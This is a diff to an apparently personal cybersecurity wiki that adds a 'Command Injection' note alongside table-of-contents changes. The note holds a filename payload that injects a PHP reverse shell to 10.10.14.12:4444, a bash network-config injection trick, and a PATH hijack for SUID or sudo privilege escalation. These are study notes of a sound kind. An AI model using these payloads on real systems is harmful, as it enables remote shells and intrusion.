@@ -249,6 +249,8 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE." />
 
 <li>CMS Exploitation</li>
 
+<li>Command Injection</li>
+
 <li>Computer Architecture</li>
 
 <li>Content Management Software</li>
@@ -9656,7 +9658,7 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE." />
 <div created="20210810022253593" modified="20210825230930363" title="$:/state/toc/TableOfContents/Tech-Game Development--118161433">
 <pre>close</pre>
 </div>
-<div created="20211007075548568" list="[[Cyber Security]] [[Binary Exploitation / Pwn]] [[Penetration Testing Framework]] CrappyMakerProgrammer Tech [[Game Development]]" modified="20211008092230237" title="$:/StoryList">
+<div created="20211007075548568" list="[[Cyber Security]] [[Binary Exploitation / Pwn]] [[Penetration Testing Framework]] [[Command Injection]] CrappyMakerProgrammer Tech [[Game Development]]" modified="20211008121142175" title="$:/StoryList">
 <pre></pre>
 </div>
 <div plugin-type="info" title="$:/temp/info-plugin" type="application/json">
@@ -10295,6 +10297,49 @@ https://www.carousell.sg/sell</pre>
 ! Wordpress
 ! Umbraco
 ! pfSense</pre>
+</div>
+<div created="20211008121145737" modified="20211008121934967" title="Command Injection">
+<pre>! Samples of command injection
+
+!! PHP
+
+```
+exec(&quot;nohup /bin/rm -f $path$value &gt; /dev/null 2&gt;&amp;1 &amp;&quot;);
+```
+
+You can set the `$value` (Filename) to be `a;php -r '$sock=fsockopen(&quot;10.10.14.12&quot;,4444);exec(&quot;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'#`
+
+# Add `;` to continue to next command
+# Add `#` to comment out everything else
+
+
+!! Bash Scripting - Setting Variables
+
+```
+for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
+        echo &quot;interface $var:&quot;
+        read x
+        while [[ ! $x =~ $regexp ]]; do
+                echo &quot;wrong input, try again&quot;
+                echo &quot;interface $var:&quot;
+                read x
+        done
+        echo $var=$x &gt;&gt; /etc/sysconfig/network-scripts/ifcfg-guly
+done
+```
+
+Usually the output will be `NAME=value`, but you can set it to be `NAME=value command`, where the payload is `value command`
+
+!! Methods
+
+Environment Carry Over 
+
+# Modifying PATH
+## Set it to `PATH=/tmp:$PATH`
+## Add your custom library to `/tmp`
+## When running the SUID / Sudo binary, it can execute your custom code
+# Bash Functions
+</pre>
 </div>
 <div created="20210825162607908" modified="20210825162640657" title="Computer Architecture">
 <pre>! Sample Architectures
